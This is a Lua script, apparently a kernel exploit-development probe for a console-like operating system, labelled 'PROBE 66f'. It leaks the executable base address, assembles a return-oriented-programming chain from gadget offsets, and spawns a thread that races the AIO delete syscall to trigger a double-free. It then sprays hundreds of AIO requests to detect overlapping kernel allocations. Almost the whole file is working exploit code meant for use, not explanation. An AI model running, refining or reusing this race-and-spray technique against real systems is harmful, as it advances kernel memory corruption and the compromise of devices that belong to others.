-- CRASH_CLASS: MODERATE
-- PROBE 66f: Massive AIO spray to exhaust per-CPU caches
--
-- All previous probes used ≤128 spray requests (≤384 64-byte zone allocs).
-- If per-CPU alloc+free buckets hold ~128 items, the spray never reaches
-- central zone cache where the double-free's second copies live.
--
-- This probe: 48 victims → race delete → 256 spray submits (768 64-byte zone
-- allocs) → sequential 1-by-1 delete. If two spray items share sub-object
-- memory (from double-free), the second delete frees already-freed memory.
-- Detect via: status anomalies, crashes, or result-word aliasing.

print("=== PROBE 66f: massive spray (256 AIO) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)

-- Eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))

local g_pop_rax  = eb + 0x992
local g_pop_rdi  = eb + 0xC9DFE
local g_pop_rsi  = eb + 0xD77D
local g_pop_rdx  = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local fd_zero = sgn(mk(5)(uint64(0), uint64(0), uint64(0)))
if fd_zero < 0 then
    -- Try /dev/zero
    local function put_str(s)
        local p = memory.alloc(#s + 2)
        for i = 1, #s do pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end) end
        pcall(function() memory.write_byte(p + #s, 0) end)
        return p
    end
    fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
end
print("fd_zero=" .. fd_zero)

-- Shared buffers
local reqs_b = memory.alloc(0x30)
local dbuf   = memory.alloc(0x4000)
local rbuf   = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)
local markerC = memory.alloc(8)

local function submit_one(sz)
    sz = sz or 16
    wq(N(reqs_b), uint64(0))
    wq(N(reqs_b) + 8, uint64(sz))
    local bh, bl = get_hi_lo(uint64(N(dbuf)))
    wd(N(reqs_b) + 0x10, bl); wd(N(reqs_b) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(rbuf)))
    wd(N(reqs_b) + 0x18, rl); wd(N(reqs_b) + 0x1C, rh)
    wd(N(reqs_b) + 0x20, fd_zero); wd(N(reqs_b) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs_b)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end
local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end

-- =========================================================
-- [A] Measure AIO budget first
-- =========================================================
print("[A] Measuring AIO request budget...")
local budget_ids = {}
for i = 1, 512 do
    local id = submit_one()
    if id == 0 then break end
    poll_one(id)
    table.insert(budget_ids, id)
end
local budget = #budget_ids
print("  Budget: " .. budget .. " concurrent requests")

-- Clean up budget test
local bd = memory.alloc(4 * budget + 4)
local bs = memory.alloc(4 * budget + 4)
for i = 0, budget - 1 do
    wd(N(bd) + i * 4, budget_ids[i + 1])
    wd(N(bs) + i * 4, 0xDEAD)
end
pcall(function()
    mk(662)(uint64(N(bd)), uint64(budget), uint64(N(bs)))
end)
budget_ids = nil
if not alive() then print("DEAD after budget test"); return end

local VICTIMS = 48
local SPRAY = math.min(256, budget - VICTIMS - 16)
print("  Using SPRAY=" .. SPRAY)

-- =========================================================
-- [B] Double-free + massive spray (3 trials)
-- =========================================================
print("")
print("[B] Race + massive spray")

local del_ids  = memory.alloc(4 * VICTIMS + 0x10)
local stChild  = memory.alloc(4 * VICTIMS + 0x10)
local stMain   = memory.alloc(4 * VICTIMS + 0x10)

for trial = 1, 3 do
    if not alive() then print("  trial " .. trial .. ": DEAD"); break end

    -- Submit + poll victims
    local vids = {}
    for i = 1, VICTIMS do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(vids, id) end
    end
    local vc = #vids
    if vc < 16 then print("  trial " .. trial .. ": only " .. vc .. " victims"); break end

    for i = 0, vc - 1 do
        wd(N(del_ids) + i * 4, vids[i + 1])
        wd(N(stChild) + i * 4, 0xCCCCCCCC)
        wd(N(stMain) + i * 4, 0xDDDDDDDD)
    end
    wq(N(markerC), uint64(0))

    -- Child ROP for 662 race
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function em(v) wq(rsp + off, v); off = off + 8 end
    em(g_pop_rax); em(uint64(0xCC))
    em(g_pop_rdi); em(uint64(N(markerC)))
    em(g_mov_m_rax)
    em(g_pop_rdi); em(uint64(N(del_ids)))
    em(g_pop_rsi); em(uint64(vc))
    em(g_pop_rdx); em(uint64(N(stChild)))
    em(g_pop_rax); em(uint64(662))
    em(stub)
    em(g_pop_rax); em(uint64(0xCD))
    em(g_pop_rdi); em(uint64(N(markerC)))
    em(g_mov_m_rax)
    em(g_pop_rdi); em(uint64(0))
    em(g_pop_rax); em(uint64(431))
    em(stub)

    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid_p = memory.alloc(8); wq(N(tid_p), uint64(0))
    wq(N(par) + 0x30, tid_p)

    pcall(function() mk(455)(par, uint64(0x38)) end)
    pcall(function()
        mk(662)(uint64(N(del_ids)), uint64(vc), uint64(N(stMain)))
    end)
    -- Wait for child
    for w = 1, 50000 do local _ = rd(N(dbuf)) end

    local doubles = 0
    for i = 0, vc - 1 do
        local sM = rd(N(stMain) + i * 4) or 0xDDDDDDDD
        local sC = rd(N(stChild) + i * 4) or 0xCCCCCCCC
        if sM == 0 and sC == 0 then doubles = doubles + 1 end
    end

    if not alive() then
        print(string.format("  trial %d: dbl=%d → DEAD during race", trial, doubles))
        break
    end

    -- MASSIVE SPRAY: submit SPRAY requests
    -- Use different read sizes to fingerprint each request
    local spray_ids = {}
    for i = 1, SPRAY do
        if not alive() then break end
        local sz = 8 + (i % 8) * 8  -- sizes 8,16,24,32,40,48,56,64 rotating
        local id = submit_one(sz)
        if id ~= 0 then
            poll_one(id)
            table.insert(spray_ids, id)
        end
    end

    if not alive() then
        print(string.format("  trial %d: dbl=%d spray=%d → DEAD during spray", trial, doubles, #spray_ids))
        break
    end

    -- Sequential 1-by-1 delete of spray items
    -- Track: status values, crashes
    local ok_count = 0
    local err_count = 0
    local crash_count = 0
    local err_codes = {}

    for i = 1, #spray_ids do
        if not alive() then crash_count = crash_count + 1; break end
        wd(N(one_id), spray_ids[i])
        wd(N(one_st), 0xDEADDEAD)
        local ok = pcall(function()
            mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
        end)
        if not ok then
            crash_count = crash_count + 1
        else
            local st = rd(N(one_st)) or 0xDEADDEAD
            if st == 0 then
                ok_count = ok_count + 1
            else
                err_count = err_count + 1
                local code = string.format("0x%08X", st)
                err_codes[code] = (err_codes[code] or 0) + 1
            end
        end
    end

    local err_str = ""
    for code, cnt in pairs(err_codes) do
        err_str = err_str .. string.format(" %s×%d", code, cnt)
    end
    if err_str == "" then err_str = " (none)" end

    print(string.format(
        "  trial %d: dbl=%d spray=%d del: ok=%d err=%d crash=%d errs=%s",
        trial, doubles, #spray_ids, ok_count, err_count, crash_count, err_str))

    if crash_count > 0 or err_count > 0 then
        print("  *** ANOMALY DETECTED ***")
    end

    if not alive() then break end
end

if not alive() then
    print("DEAD — crash during sequential delete proves overlap!")
end

print("")
print("=== PROBE 66f COMPLETE ===")
